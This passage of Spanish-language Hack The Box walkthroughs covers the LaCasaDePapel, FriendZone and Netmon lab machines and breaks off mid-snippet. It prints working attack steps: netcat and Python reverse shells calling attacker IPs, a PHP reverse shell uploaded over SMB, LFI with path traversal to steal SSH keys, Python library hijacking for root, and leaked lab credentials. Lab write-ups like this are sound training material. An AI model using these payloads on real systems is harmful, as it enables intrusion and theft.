\u0026#39;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg\u0026#39;] pass_dba = \u0026#34;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz\u0026#34; for key in list_keys: k = str(user) r = decrypt(pass_dba, k) print(k +\u0026#39; : \u0026#39; + r)   Esta porcion de codigo contiene una lista de las claves (keys) probables para la contraseña (pass_dba) del usuario dba que corresponde igualmente para el usuario root, dentro de las claves tambien encontramos usuarios, ya que una key podria ser o no el nombre de un usuario, de igual manera agregamos las contraseñas de la base de datos de los usuarios bob y charlie. En resumen agregamos a la lista todas las posibles claves que encontramos dentro de la maquina. Al correr nuestro script obtenemos el siguente resultado:\nNuestra contraseña para el usuario dba y para root es R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!, la clave que fue satisfactoria fue una contraseña en este caso la contraseña de bob que se encuentra en la base de datos. Asi obtenemos nuestra bandera root.txt.\n","description":"","id":82,"section":"posts","tags":["linux"],"title":"Hack The Box - Fortune","uri":"https://sckull.github.io/posts/fortune/"},{"content":"LaCasaDePapel es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre LaCasaDePapel     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.131   Maker thek    MASSCAN Escaneo de todos los puertos tcp/udp.\n1 2 3 4 5 6 7 8 9 10  masscan -p1-65535,U:1-65535 10.10.10.131 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 443/tcp on 10.10.10.131 Discovered open port 22/tcp on 10.10.10.131 Discovered open port 80/tcp on 10.10.10.131 Discovered open port 21/tcp on 10.10.10.131   NMAP Escaneo de puertos encontrados con MASSCAN.\nStarting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 00:48 BST Nmap scan report for 10.10.10.131 Host is up (0.22s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA) | 256 41:e4:95:a3:39:0b:25:f9:da🇩🇪be:6a:dc:59:48:6d (ECDSA) |_ 256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519) 80/tcp open http Node.js Express framework |_http-title: La Casa De Papel 443/tcp open ssl/http Node.js Express framework | ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel | Not valid before: 2019-01-27T08:35:30 |_Not valid after: 2029-01-24T08:35:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: | http/1.1 |_ http/1.0 Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds Agregamos lacasadepapel.htb a nuestro archivo /etc/hosts.\nHTTPS Al visitar la pagina en https nos muestra un error de certificado.\nHTTP Al visitar la pagina nos muestra una imagen QR.\nFTP Encontramos ftp en su version vftpd 2.3.4 el cual tiene una vulnerabilidad de backdoor, utilizamos exploit escrito en python para ejecutar comandos, cuando lo ejecutamos nos muestra un mensaje de Psy Shell, intentamos conectarnos al puerto 6200, y encontramos una shell de Psysh,y con el comando dir la clase $tokyo.\nExpliting Vsftpd\nGithub - Exploit\nUtilizamos el comando \u0026lsquo;show $tokyo\u0026rsquo; para mostrar el codigo que en este se encuentra.\n1 2 3 4 5 6 7 8  class Tokyo { private function sign($caCert,$userCsr) { $caKey = file_get_contents(\u0026#39;/home/nairobi/ca.key\u0026#39;); $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, [\u0026#39;digest_alg\u0026#39;=\u0026gt;\u0026#39;sha256\u0026#39;]); openssl_x509_export($userCert, $userCertOut); return $userCertOut; } }   Al parecer es una clase que crea un certificado para tener acceso a la pagina en https, vamos a generar el nuestro utilizando la key (ca.key) que utiliza la funcion. Para leer este archiv utilizamos: file_get_contents(archivo).\nIBM - Certificate\nGithub - Certificate\ntecadmin - Certificate\nGeneramos nuestro certificado para firefox con los siguientes comandos:\n1  openssl req -key ca.key -new -x509 -days 365 -out lacasadepapelhtb.crt -subj \u0026#34;/C=US/ST=New York/L=Brooklyn/O= La Casa De Papel/CN=lacasadepapel.htb\u0026#34;   1  openssl pkcs12 -export -in lacasadepapelhtb.crt -inkey ca.key -out lacasadepapelhtb.p12   Importamos nuestro certificado a firefox y al visitar la pagina nos muestra lo siguiente:\nAl visitar SEASON-1 nos muestra una lista de videos en formato avi al visitar o dar click a uno de ellos nos descarga un archivo, vacio.\n01.avi\nhttps://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp Dicha url en su parte final (/U0VBU09OLTEvMDEuYXZp) esta codificada en base64, por lo que al decodificarla obtenemos el valor de SESEASON-1/01.avi, sabiendo esto podemos codificar ../../../../etc/passwd en base64 para observar que pasa si codificamos una ruta de un archivo para descargarla.\nAsi es como obtenemos el archivo /etc/passwd, ahora que sabemos como descargar archivos vamos a descargar el id_rsa (../.ssh/id_rsa) del usuario berlin y asi conectarnos mediante el servicio ssh.\nPor alguna razon el id_rsa del usuario berlin no funciona en si mismo, funciona con el usuario professor y dali. En el caso de dali debemos de agregar nuestra clave al archivo authorized_keys mediante PSYSH.\nUSUARIO DALI PSYSH Debugging Psysh\nUtilizando psysh en el puerto 6200 mediante telnet podemos leer y escribir archivos, en este caso vamos a leer el archivo /etc/passwd.\n$file = file_get_contents('/etc/passwd');echo $file; Al revisar dicho archivo vemos que el usuario dali tiene como shell psysh y su directorio principal es /home/dali.\netcpasswd format\nYa que sabemos que psysh es ejecutado por el usuario dali y tenemos acceso a su directorio principal, podemos generar y agregar nuestra id_rsa.pub a el archivo authorized_keys del usuario dali, para luego poder conectarnos por medio de ssh.\n1  $text = \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkleT1qRUUh9Qu7dT4UXLIfsQc4qkEvKax/+7T3l24zhIJm3R2KOEbfOYdtRBwVOyoE8YfXp7YjPV/lFa7W5MkOoXACk3bl1rYS8GrRr/uYMabrponpZTFPMRl90lBArarRPMFtEKtrhoTw+QBSdKa8Be5AOCp5I+Ky8hF/Pf7uSgThtYD7/LLFIpW6YJJu06M890xah1TwuXkgqzPfPWtaVOYvS1smnSYbjflNtMQ0pHSHBTElXx9r9VmFXIslBkST1iHbQT5ZzWHvKxFQkAEoLyAqdvIkgJ7zKbcEwz9bQO4dPVe18D4srDGUnoG+v+/YNexvwmHaCP/V5cUdupv root@sckull\u0026#34;;$filename = \u0026#34;/home/dali/.ssh/authorized_keys\u0026#34;;$fh = fopen($filename, \u0026#34;a\u0026#34;);fwrite($fh, $text);fclose($fh);   Escribimos y verificamos.\nAhora nos conectamos con la clave de \u0026lsquo;berlin\u0026rsquo;.\nUSUARIO PROFESSOR - SSH Para el usuario professor utilizamos la misma clave para conectarnos y obtenemos una sesion ssh.\nUSER - FLAG Al enumerar las carpetas de los usuarios encontramos nuestra bandera user.txt en la carpeta de berlin, para obtenernuestra bandera encodeamos la direccion en base64 y la descargamos de la misma forma que la clave de berlin.\nPRIVILEGE ESCALATION Utilizamos pspy64 para ver los crons que se ejecutan.\nEncontramos un proceso que se ejecuta que utiliza node y un archivo memcached.js.\nEl archivo memcached.js se encuentra en nuestra carpeta principal (/home/professor) pero no tenemos permisos, tambien se encuentra otro archivo llamadao memcached.ini que contiene un comando que ejecuta node con el archivo memcached.js.\nHacemos una prueba de ping con el usuario root a nuestra ip, agregamos lo siguiente a memcached.ini, pero primero renombramos el archivo anterior a otro ya que no tenemos permisos, creamos un nuevo archivo con el mismo nombre y agregamos lo siguiente.\nY obtenemos la respuesta de la maquina.\nPara obtener una shell inversa creamos un archivo con nuestra shell inversa dentro, y agregamos su ejecucion dentro del archivo memcached.ini.\nbatman.sh\n1  echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.12.119 7878 \u0026gt;/tmp/f\u0026#34; \u0026gt; /tmp/batman.sh   1 2 3  memcached.ini [program:memcached] command = sudo -u root sh /tmp/batman.sh   ","description":"","id":83,"section":"posts","tags":["linux"],"title":"Hack The Box - LaCasaDePapel","uri":"https://sckull.github.io/posts/lacasadepapel/"},{"content":"FriendZone es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre FriendZone     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.123   Maker askar    NMAP Escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-10 14:12 PST Nmap scan report for 10.10.10.123 Host is up (0.20s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.20 seconds   FTP Haciendo un login como usuario anonimo no encontramos nada en este puerto.\nENUM HTTP 1 2 3 4  gobuster -u 10.10.10.123 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -np -x php,txt,html -t 15 -q /index.html (Status: 200) /wordpress (Status: 301) /robots.txt (Status: 200)   Ninguno de los directorios y archivos encontrados en el puerto 80 (HTTP) son de ayuda, pero en el index de la pagina aparece un dominio que podriamos utilizar.\nfriendzoneportal.red. Agregamos el dominio al archivo host (/etc/hosts) y encontramos que la pagina tiene contenido en el protocolo https, procedemos a enumerar los directorios y archivos.\nENUM HTTPS 1 2  gobuster -u https://friendzoneportal.red/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -np -k -x php,txt,html -t 35 -q /index.html (Status: 200)   ENUM Samba Utilizando la herramienta smbclient para enumerar los sharenames que estan en el servicio de samba.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  smbclient -L 10.10.10.123 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers Files Disk FriendZone Samba Server Files /etc/Files general Disk FriendZone Samba Server Files Development Disk FriendZone Samba Server Files IPC$ IPC IPC Service (FriendZone server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FROLIC   En uno de los sharenames podemos ver que Files tiene un comentario que nos dice se encuentra en la carpeta local /etc/files. al logearnos a general encontramos unas credenciales y una frase creds for the admin THING que podria hacer referencia a algun panel de administracion, en este sharename no tenemos permisos suficientes para subir o escribir archivos.\n1 2 3 4 5 6 7  smbclient \\\\\\\\10.10.10.123\\\\general Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Jan 16 12:10:51 2019 .. D 0 Wed Jan 23 13:51:02 2019 creds.txt N 57 Tue Oct 9 16:52:42 2018   creds.txt\n1 2  creds for the admin THING: admin:WORKWORKHhallelujah@#   Utilizando las credenciales que encontramos anteriormente, en Development no encontramos nada pero si podemos escribir o subir archivos, mas no ejecutarlos.\n1 2 3 4 5 6  smbclient \\\\\\\\10.10.10.123\\\\Development --user=admin WORKWORKHhallelujah@# smb: \\\u0026gt; ls . D 0 Sun Feb 10 19:12:08 2019 .. D 0 Wed Jan 23 13:51:02 2019 php-reverse-shell.php N 5493 Sat Feb 9 18:47:48 2019   ENUM SubDOMINIOS Utilizando la ip y el dominio anteriormente utilizado en https, encontramos varios subdominios:\n1 2 3 4 5 6 7 8 9 10 11  dig axfr friendzoneportal.red @10.10.10.123 friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzoneportal.red.\t604800\tIN\tAAAA\t::1 friendzoneportal.red.\t604800\tIN\tNS\tlocalhost. friendzoneportal.red.\t604800\tIN\tA\t127.0.0.1 admin.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 files.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 imports.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 vpn.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800   Ver Nmap scan \u0026ndash;\u0026gt; friendzone.red (CommonName)\n1 2 3 4 5 6 7 8 9 10  dig friendzone.red axfr @10.10.10.123 friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red.\t604800\tIN\tAAAA\t::1 friendzone.red.\t604800\tIN\tNS\tlocalhost. friendzone.red.\t604800\tIN\tA\t127.0.0.1 administrator1.friendzone.red. 604800 IN A\t127.0.0.1 hr.friendzone.red.\t604800\tIN\tA\t127.0.0.1 uploads.friendzone.red.\t604800\tIN\tA\t127.0.0.1 friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800   Agregamos los subdominios a /etc/hosts.\n1 2 3 4 5 6 7 8  admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red   ENUMERANDO DIRECTORIOS HTTPS -\u0026gt; friendzone.red https://friendzone.red/ /js/js/\nhttps://uploads.friendzone.red 1 2 3  /files /files/note /upload.php   https://hr.friendzone.red EMPTY\nhttps://administrator1.friendzone.red 1 2 3  /dashboard.php /login.php /timestamp.php   LFI - Securityartwork\nLFI - xapax\nhttps://administrator1.friendzone.red/ En el primer subdominio econtramos un login y utilizando las credenciales nos muestra un mensaje, donde nos indica que para mostrar la imagen del script debemos de insertar lo siguiente: ?image_id=a.jpg\u0026amp;pagename=timestamp\nAl realizar dicho request a la pagina obtenemos la imagen y lo que parece el tiempo en que se ejecuto el programa.\nSi nos concentramos en la solicitud de la pagina podemos ver que existe un parametro que llama(include $_GET[\u0026lsquo;pagina\u0026rsquo;];) a una pagina pagename=timestamp, anteriormente enumeramos los directorios y archivos de la pagina. Al intentar con el archivo login.php en lugar de timestamp nos muestra el siguiente mensaje.\nPodemos observar que la pagina es vulnerable a ataques de LFI, cuando se hace la solicitud del archivo (timestamp,login) este lo ejecuta y lo muestra por debajo como en la figura anterior. Para poder saltarnos la ejecutcion podemos utilizar un filtro de php en este caso php://filter/convert.base64-encode/resource=archivophp y asi obtener el codigo fuente de los archivos locales en base64 para luego decodificarlo.\npagename=php://filter/convert.base64-encode/resource=dashboard\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  \u0026lt;?php //echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Smart photo script for friendzone corp !\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; //echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h3\u0026gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;title\u0026gt;FriendZone Admin !\u0026lt;/title\u0026gt;\u0026#34;; $auth = $_COOKIE[\u0026#34;FriendZoneAuth\u0026#34;]; if ($auth === \u0026#34;e7749d0f4b4da5d03e6e9196fd1d18f1\u0026#34;){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Smart photo script for friendzone corp !\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h3\u0026gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !\u0026lt;/h3\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; if(!isset($_GET[\u0026#34;image_id\u0026#34;])){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;image_name param is missed !\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;please enter it to show the image\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;default is image_id=a.jpg\u0026amp;pagename=timestamp\u0026lt;/p\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; }else{ $image = $_GET[\u0026#34;image_id\u0026#34;]; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;img src=\u0026#39;images/$image\u0026#39;\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;Something went worng ! , the script include wrong param !\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; include($_GET[\u0026#34;pagename\u0026#34;].\u0026#34;.php\u0026#34;); //echo $_GET[\u0026#34;pagename\u0026#34;];  } }else{ echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;p\u0026gt;You can\u0026#39;t see the content ! , please login !\u0026lt;/center\u0026gt;\u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt;   pagename=php://filter/convert.base64-encode/resource=timestamp\n1 2 3 4  \u0026lt;?php $time_final = time() + 3600; echo \u0026#34;Final Access timestamp is $time_final\u0026#34;; ?\u0026gt;   pagename=php://filter/convert.base64-encode/resource=../www/admin/login\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  \u0026lt;?php $username = $_POST[\u0026#34;username\u0026#34;]; $password = $_POST[\u0026#34;password\u0026#34;]; //echo $username === \u0026#34;admin\u0026#34;; //echo strcmp($username,\u0026#34;admin\u0026#34;);  if ($username===\u0026#34;admin\u0026#34; and $password===\u0026#34;WORKWORKHhallelujah@#\u0026#34;){ setcookie(\u0026#34;FriendZoneAuth\u0026#34;, \u0026#34;e7749d0f4b4da5d03e6e9196fd1d18f1\u0026#34;, time() + (86400 * 30)); // 86400 = 1 day  echo \u0026#34;Login Done ! visit /dashboard.php\u0026#34;; }else{ echo \u0026#34;Wrong !\u0026#34;; } ?\u0026gt;   OBTENIENDO ACCESO Anteriormente pudimos obtener el codigo fuente de las paginas locales y accesso a dos de los sharenames disponibles en el servicio de samba, pero en uno de ellos nos indica que la carpeta local del sharename Files es en /etc/Files por lo que concluimos que Development y general estan en la carpeta /etc/Development y /etc/general, de los cuales solo tenemos acceso a Development, procedemos a subir un archivo en samba con el sharename Development y hacer una solicitud a la carpeta /etc/Development/NuestroArchivo.\n*batman.php*\n1  echo \u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;/center\u0026gt;\u0026lt;h1\u0026gt;Yo soy Batman\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;;?\u0026gt;\u0026#39; \u0026gt; batman.php   Smbclient smbclient \\\\\\\\10.10.10.123\\\\Development --user=admin WORKWORKHhallelujah@# Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; put batman.php putting file batman.php as \\batman.php (0.0 kb/s) (average 0.0 kb/s) Solicitud:\nhttps://administrator1.friendzone.red/dashboard.php?pagename=php://filter/resource=/etc/Development/batman\nComo podemos ver nuestro archivo con un simple texto se ejecuta, de la misma forma podemos ejecutar comandos mediante php y asi obtener una shell inversa.\n1 2  echo \u0026#39;\u0026lt;?php system(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.15.78 7878 \u0026gt;/tmp/f\u0026#34;);?\u0026gt;\u0026#39; \u0026gt; batman_sh.php put batman_sh.php   nc -lvp 7878 USER Flag Para el user flag solo falto un poco de enumeracion en los archivos locales y en la configuracion de la base de datos mysql del servidor encontramos un usuario y contraseña de un usuario.\nssh friend@10.10.10.123 Password: Agpyu12!0.213$ ROOT SHELL Utilizando pspy para encontrar tareas que se ejecutan como usuario root logramos ver una que se encuentra dentro de la carpeta /opt, es un script escrito en python llamado reporter.py, el cual tiene permisos root, dentro del script podemos ver que importa la libreria os e imprime algunos mensajes.\nGithub - pspy\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  /opt/server_admin/reporter.py #!/usr/bin/python import os to_address = \u0026#34;admin1@friendzone.com\u0026#34; from_address = \u0026#34;admin2@friendzone.com\u0026#34; print \u0026#34;[+] Trying to send email to %s\u0026#34;%to_address #command = \u0026#39;\u0026#39;\u0026#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \u0026#34;PAPAP\u0026#34;\u0026#39;\u0026#39;\u0026#39; #os.system(command) # I need to edit the script later # Sam ~ python developer   Utilizando la tecnica de Python Library Hijacking podemos obtener una shell inversa editando la libreria os.py que se encuentra en /usr/lib/python2.7/os.py podemos utilizar el siguiente codigo.\nrastating - Python Library Hijacking\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.15.126\u0026#34;,7878));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); import os import pty import socket lhost = \u0026#34;10.10.15.126\u0026#34; lport = 7878 ZIP_DEFLATED = 0 class ZipFile: def close(*args): return def write(*args): return def __init__(self, *args): return s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(\u0026#34;HISTFILE\u0026#34;,\u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) s.close()   Como podemos ver en el script se ejecuta cada medio minuto por lo cual obtendremos una shell inversa como usuario root.\n","description":"","id":84,"section":"posts","tags":["linux"],"title":"Hack The Box - FriendZone","uri":"https://sckull.github.io/posts/friendzone/"},{"content":"Netmon es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Netmon     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.152   Maker mrb3n    NMAP Al realizar un escaneo con nmap nos muestra servicios ftp, http y puertos de windows.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  root@sckull:~# nmap -sT -p- --min-rate 5000 10.10.10.152 -o tcp Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 18:59 GMT Warning: 10.10.10.152 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.152 Host is up (0.24s latency). Not shown: 32841 closed ports, 32683 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49673/tcp open unknown 50315/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 169.37 seconds root@sckull:~# nmap -sC -p 21,80,135,139,445 -o nmap-ports.scan 10.10.10.152 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 19:03 GMT Nmap scan report for 10.10.10.152 Host is up (0.16s latency). PORT STATE SERVICE 21/tcp open ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-02-19 11:18PM 1024 .rnd | 02-25-19 09:15PM \u0026lt;DIR\u0026gt; inetpub | 07-16-16 08:18AM \u0026lt;DIR\u0026gt; PerfLogs | 02-25-19 09:56PM \u0026lt;DIR\u0026gt; Program Files | 02-02-19 11:28PM \u0026lt;DIR\u0026gt; Program Files (x86) | 02-03-19 07:08AM \u0026lt;DIR\u0026gt; Users |_02-25-19 10:49PM \u0026lt;DIR\u0026gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_clock-skew: mean: 48s, deviation: 0s, median: 47s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-03-06 19:03:57 |_ start_date: 2019-03-06 18:58:01 Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds   FTP - Puerto 21 Con las credenciales anonymous:anonymous obtenemos acceso y tambien la bandera user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  root@sckull:~# ftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls -lah 200 PORT command successful. 125 Data connection already open; Transfer starting. 11-20-16 09:46PM \u0026lt;DIR\u0026gt; $RECYCLE.BIN 02-02-19 11:18PM 1024 .rnd 11-20-16 08:59PM 389408 bootmgr 07-16-16 08:10AM 1 BOOTNXT 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Documents and Settings 02-25-19 09:15PM \u0026lt;DIR\u0026gt; inetpub 03-06-19 02:04PM 738197504 pagefile.sys 07-16-16 08:18AM \u0026lt;DIR\u0026gt; PerfLogs 02-25-19 09:56PM \u0026lt;DIR\u0026gt; Program Files 02-02-19 11:28PM \u0026lt;DIR\u0026gt; Program Files (x86) 02-25-19 09:56PM \u0026lt;DIR\u0026gt; ProgramData 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Recovery 02-03-19 07:04AM \u0026lt;DIR\u0026gt; System Volume Information 02-03-19 07:08AM \u0026lt;DIR\u0026gt; Users 02-25-19 10:49PM \u0026lt;DIR\u0026gt; Windows 226 Transfer complete. ftp\u0026gt; cd Users 250 CWD command successful. ftp\u0026gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 10:44PM \u0026lt;DIR\u0026gt; Administrator 02-02-19 11:35PM \u0026lt;DIR\u0026gt; Public 226 Transfer complete. ftp\u0026gt; cd Public 250 CWD command successful. ftp\u0026gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Documents 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Downloads 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Music 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Pictures 02-02-19 11:35PM 33 user.txt 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Videos 226 Transfer complete. ftp\u0026gt; bin 200 Type set to I. ftp\u0026gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 33 bytes received in 0.37 secs (0.0877 kB/s) ftp\u0026gt; root@sckull:~# cat user.txt dd58ce67b49e15105e88096c8d9255a5   ENUMERACION FTP Al realizar una enumeracion a los directorios por medio de ftp encontramos un programa llamado PRTG Network Monitor el cual funciona para monitoreo de red, el uso de ancho de banda o tiempo de actividad.\nHTTP - puerto 80 Realizando una busqueda por google nos encontramos con exploits para este monitor de red, pero para ello debemos de logearnos al portal web, el usuario y contraseña por default (prtgadmin:prtgadmin) no funcionan, por lo que yendo ún poco mas profundo encontramos un pequeño post en reddit que hablan acerca de un archivo \u0026lsquo;PRTG Configuration.dat\u0026rsquo; que puede contener contraseñas que no estan encriptadas de igual forma en archivo \u0026lsquo;PRTG Configuration.old\u0026rsquo;.\nreddit/prtg_gave_away_some_of_your_passwords\nSabiendo esto buscamos dentro de la maquina los archivos, por lo general se encuentran en el misma direccion que el programa (../Program Files/PRTG Network Monitor/PRTG configuration.dat) pero, al parecer el administrador cambio la direccion. Para enumerar archivos de manera rapida utilizamos Filezilla.\nLos archivos los pudimos encontrar en /Users/All Users/Paessler/PRTG Network Monitor.\nHicimos una busqueda de contraseñas dentro de los archivos y en PRTG Configuration.old.bak encontramos una contraseña para el usuario prtgadmin.\n1 2 3 4  \u0026lt;dbpassword\u0026gt; \u0026lt;!-- User: prtgadmin --\u0026gt; 